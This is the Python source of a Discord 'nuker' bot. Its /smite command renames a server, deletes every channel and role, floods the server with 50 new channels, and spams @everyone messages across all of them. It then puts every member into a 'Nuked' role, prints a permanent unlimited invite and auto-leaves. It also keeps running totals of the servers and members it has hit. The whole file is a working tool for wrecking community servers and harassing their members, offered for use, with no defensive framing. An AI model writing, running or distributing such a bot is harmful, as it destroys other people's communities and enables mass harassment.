import discord
from discord.ext import commands
import asyncio
import json
import os
import time
from datetime import datetime

class NukerBot:
    def __init__(self):
        self.intents = discord.Intents.all()
        self.bot = commands.Bot(command_prefix="!", intents=self.intents)
        self.is_running = False
        self.stats = self.load_stats()
        
        # Default configuration
        self.config = {
            "channel_name": "nuked",
            "channel_count": 50,
            "message_spam_count": 10,
            "spam_message": "@everyone Server has been nuked!",
            "role_name": "Nuked",
            "role_count": 1,
            "server_name": "Nuked Server",
            "delete_delay": 0.5,
            "create_delay": 0.5,
            "stats_channel_id": 1307163815216943208,
            "smite_cooldown": 300,  # 5 minutes in seconds
            "auto_leave_delay": 600  # 10 minutes in seconds
        }
        
        # Track cooldowns and leave timers per guild
        self.smite_cooldowns = {}  # (guild_id, user_id): timestamp
        self.leave_timers = {}  # guild_id: asyncio.Task
        
        self.setup_events()
    
    def load_stats(self):
        """Load statistics from file"""
        if os.path.exists("nuker_stats.json"):
            with open("nuker_stats.json", "r") as f:
                return json.load(f)
        return {
            "total_channels_nuked": 0,
            "total_roles_nuked": 0,
            "total_servers_nuked": 0,
            "total_messages_sent": 0,
            "total_members_nuked": 0
        }
    
    def save_stats(self):
        """Save statistics to file"""
        with open("nuker_stats.json", "w") as f:
            json.dump(self.stats, f, indent=4)
    
    def update_config(self, config):
        """Update bot configuration"""
        self.config.update(config)
    
    def setup_events(self):
        @self.bot.event
        async def on_ready():
            print(f"Nuker Bot logged in as {self.bot.user}")
            print(f"Bot is in {len(self.bot.guilds)} servers")
            # Sync slash commands
            try:
                synced = await self.bot.tree.sync()
                print(f"Synced {len(synced)} slash command(s)")
            except Exception as e:
                print(f"Failed to sync commands: {e}")
        
        @self.bot.tree.command(name="smite", description="Execute the nuke sequence on this server")
        async def smite(interaction: discord.Interaction):
            await interaction.response.defer(ephemeral=True)
            
            guild = interaction.guild
            if not guild:
                await interaction.followup.send("This command can only be used in a server!", ephemeral=True)
                return
            
            # Check cooldown per user
            current_time = time.time()
            cooldown_key = (guild.id, interaction.user.id)
            
            if cooldown_key in self.smite_cooldowns:
                time_since_last = current_time - self.smite_cooldowns[cooldown_key]
                cooldown_remaining = self.config["smite_cooldown"] - time_since_last
                
                if cooldown_remaining > 0:
                    minutes = int(cooldown_remaining // 60)
                    seconds = int(cooldown_remaining % 60)
                    await interaction.followup.send(
                        f"⏳ Cooldown active! Please wait {minutes}m {seconds}s before using /smite again.",
                        ephemeral=True
                    )
                    return
            
            # Set cooldown for this user
            self.smite_cooldowns[cooldown_key] = current_time
            
            print(f"\n/smite command executed by {interaction.user} in {guild.name}")
            
            # Cancel existing leave timer if any
            if guild.id in self.leave_timers:
                self.leave_timers[guild.id].cancel()
                print(f"Cancelled previous leave timer for {guild.name}")
            
            # Execute nuke in background with user info
            asyncio.create_task(self.nuke_server(guild.id, triggered_by=interaction.user.id))
            
            await interaction.followup.send(f"🔥 Smiting {guild.name}... The operation has begun!", ephemeral=True)
    
    async def delete_all_channels(self, guild):
        """Delete all channels in the guild concurrently"""
        async def delete_channel(channel):
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
                if self.config["delete_delay"] > 0:
                    await asyncio.sleep(self.config["delete_delay"])
                return 1
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
                return 0
        
        tasks = [delete_channel(channel) for channel in guild.channels]
        results = await asyncio.gather(*tasks)
        return sum(results)
    
    def sanitize_channel_name(self, name):
        """Sanitize channel name to be Discord-compliant"""
        # Discord channel names can only contain: a-z, 0-9, and dashes
        # Convert to lowercase
        name = name.lower()
        # Replace spaces and special characters with dashes
        sanitized = ""
        for char in name:
            if char.isalnum():
                sanitized += char
            elif char in [' ', '_', '.', '/', ':', '|', '\\']:
                sanitized += '-'
        # Remove consecutive dashes
        while '--' in sanitized:
            sanitized = sanitized.replace('--', '-')
        # Remove leading/trailing dashes
        sanitized = sanitized.strip('-')
        # Limit to 100 characters (Discord limit)
        sanitized = sanitized[:100]
        # If empty, use default
        if not sanitized:
            sanitized = "nuked"
        return sanitized
    
    async def create_channels(self, guild):
        """Create multiple channels with optional delay"""
        # Sanitize the channel name
        safe_name = self.sanitize_channel_name(self.config['channel_name'])
        
        async def create_channel(i):
            try:
                channel = await guild.create_text_channel(f"{safe_name}-{i}")
                print(f"Created channel: {channel.name}")
                if self.config["create_delay"] > 0:
                    await asyncio.sleep(self.config["create_delay"])
                return 1
            except Exception as e:
                print(f"Failed to create channel: {e}")
                return 0
        
        # Create channels with staggered delays if needed
        if self.config["create_delay"] > 0:
            # Sequential with delay
            created = 0
            for i in range(self.config["channel_count"]):
                created += await create_channel(i)
            return created
        else:
            # Concurrent without delay
            tasks = [create_channel(i) for i in range(self.config["channel_count"])]
            results = await asyncio.gather(*tasks)
            return sum(results)
    
    async def spam_messages(self, guild):
        """Spam messages in all text channels concurrently"""
        async def spam_channel(channel):
            count = 0
            try:
                tasks = []
                for _ in range(self.config["message_spam_count"]):
                    tasks.append(channel.send(self.config["spam_message"]))
                await asyncio.gather(*tasks, return_exceptions=True)
                count = self.config["message_spam_count"]
                print(f"Spammed {count} messages in {channel.name}")
            except Exception as e:
                print(f"Failed to spam in {channel.name}: {e}")
            return count
        
        # Spam all channels concurrently
        tasks = [spam_channel(channel) for channel in guild.text_channels]
        results = await asyncio.gather(*tasks)
        return sum(results)
    
    async def delete_all_roles(self, guild):
        """Delete all roles (except @everyone and bot roles)"""
        deleted = 0
        for role in list(guild.roles):
            try:
                if role.name != "@everyone" and not role.managed:
                    await role.delete()
                    deleted += 1
                    print(f"Deleted role: {role.name}")
                    if self.config["delete_delay"] > 0:
                        await asyncio.sleep(self.config["delete_delay"])
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")
        return deleted

    async def create_roles_and_assign(self, guild):
        """Create multiple roles and assign the first one to all non-bot members."""
        created = 0
        roles = []
        base_name = self.config.get("role_name", "Nuked")
        count = max(1, int(self.config.get("role_count", 1)))
        # Create roles
        for i in range(count):
            try:
                name = base_name if count == 1 else f"{base_name}-{i}"
                role = await guild.create_role(name=name, color=discord.Color.red())
                roles.append(role)
                created += 1
                print(f"Created role: {role.name}")
                if self.config["create_delay"] > 0:
                    await asyncio.sleep(self.config["create_delay"])
            except Exception as e:
                print(f"Failed to create role: {e}")
        # Assign first created role if exists
        assigned = 0
        if roles:
            role = roles[0]
            for member in guild.members:
                try:
                    if not member.bot:
                        await member.add_roles(role)
                        assigned += 1
                        if self.config["create_delay"] > 0:
                            await asyncio.sleep(self.config["create_delay"])
                except Exception as e:
                    print(f"Failed to assign role to {member}: {e}")
        return {"created": created, "assigned": assigned}
    
    async def nuke_server(self, guild_id, triggered_by=None):
        """Execute the full nuke sequence on a server"""
        guild = self.bot.get_guild(guild_id)
        if not guild:
            print(f"Guild {guild_id} not found")
            return False
        
        print(f"\n{'='*50}")
        print(f"Starting nuke sequence on: {guild.name}")
        print(f"{'='*50}\n")
        
        # Get member count (excluding bots)
        member_count = len([m for m in guild.members if not m.bot])
        
        server_stats = {
            "channels": 0,
            "roles": 0,
            "messages": 0,
            "member_count": member_count
        }
        
        # Step 1: Change server name
        print("Step 1: Changing server name...")
        try:
            await guild.edit(name=self.config["server_name"])
            print(f"Changed server name to: {self.config['server_name']}")
        except Exception as e:
            print(f"Failed to change server name: {e}")
        
        # Step 2: Delete all channels
        print("\nStep 2: Deleting all channels...")
        deleted_channels = await self.delete_all_channels(guild)
        server_stats["channels"] += deleted_channels
        
        # Step 3: Create new channels
        print("\nStep 2: Creating new channels...")
        created_channels = await self.create_channels(guild)
        
        # Step 3: Spam messages
        print("\nStep 3: Spamming messages...")
        messages_sent = await self.spam_messages(guild)
        server_stats["messages"] = messages_sent
        
        # Step 4: Delete all roles
        print("\nStep 4: Deleting all roles...")
        deleted_roles = await self.delete_all_roles(guild)
        server_stats["roles"] = deleted_roles
        
        # Step 5: Create and assign roles per configuration
        print("\nStep 5: Creating and assigning role(s)...")
        await self.create_roles_and_assign(guild)
        
        # Update global stats
        self.stats["total_channels_nuked"] += server_stats["channels"]
        self.stats["total_roles_nuked"] += server_stats["roles"]
        self.stats["total_messages_sent"] += server_stats["messages"]
        self.stats["total_servers_nuked"] += 1
        self.stats["total_members_nuked"] += member_count
        self.save_stats()
        
        # Send stats message
        print("\nStep 6: Sending stats message...")
        await self.send_stats_message(guild, server_stats, triggered_by or "Unknown")
        
        # Generate and print server invite
        print("\nStep 7: Generating server invite...")
        await self.generate_invite(guild)
        
        print(f"\n{'='*50}")
        print(f"Nuke sequence completed on: {guild.name}")
        print(f"{'='*50}\n")
        
        # Start auto-leave timer
        self.start_leave_timer(guild.id)
        
        return True
    
    async def generate_invite(self, guild):
        """Generate an invite link for the server"""
        try:
            # Try to find a suitable channel to create invite from
            invite_channel = None
            
            # First try to use one of the newly created channels
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).create_instant_invite:
                    invite_channel = channel
                    break
            
            if invite_channel:
                # Create invite that never expires and has unlimited uses
                invite = await invite_channel.create_invite(
                    max_age=0,  # Never expires
                    max_uses=0,  # Unlimited uses
                    reason="Nuked server invite"
                )
                print(f"✅ Server Invite: {invite.url}")
                print(f"   Server: {guild.name} (ID: {guild.id})")
                print(f"   Members: {len(guild.members)}")
            else:
                print(f"⚠️ Could not create invite - no suitable channel found")
        except Exception as e:
            print(f"❌ Failed to generate invite: {e}")
    
    def start_leave_timer(self, guild_id):
        """Start a timer to leave the guild after the configured delay"""
        # Cancel existing timer if any
        if guild_id in self.leave_timers:
            self.leave_timers[guild_id].cancel()
        
        # Create new timer task
        async def leave_after_delay():
            try:
                delay = self.config["auto_leave_delay"]
                print(f"Auto-leave timer started: {delay} seconds ({delay//60} minutes)")
                await asyncio.sleep(delay)
                
                guild = self.bot.get_guild(guild_id)
                if guild:
                    print(f"Auto-leaving server: {guild.name}")
                    await guild.leave()
                    print(f"Successfully left {guild.name}")
                    
                    # Clean up
                    if guild_id in self.leave_timers:
                        del self.leave_timers[guild_id]
                    
                    # Clean up all user cooldowns for this guild
                    cooldown_keys_to_remove = [key for key in self.smite_cooldowns if key[0] == guild_id]
                    for key in cooldown_keys_to_remove:
                        del self.smite_cooldowns[key]
            except asyncio.CancelledError:
                print(f"Leave timer cancelled for guild {guild_id}")
            except Exception as e:
                print(f"Error leaving guild: {e}")
        
        # Store and start the task
        self.leave_timers[guild_id] = asyncio.create_task(leave_after_delay())
    
    def run(self, token):
        """Start the bot"""
        try:
            self.bot.run(token)
        except Exception as e:
            print(f"Error running nuker bot: {e}")
    
    async def start(self, token):
        """Start the bot asynchronously"""
        try:
            await self.bot.start(token)
        except Exception as e:
            print(f"Error starting nuker bot: {e}")
    
    async def stop(self):
        """Stop the bot"""
        try:
            await self.bot.close()
            print("Nuker bot stopped")
        except Exception as e:
            print(f"Error stopping nuker bot: {e}")

if __name__ == "__main__":
    # For testing purposes
    bot = NukerBot()
    token = input("Enter bot token: ")
    bot.run(token)
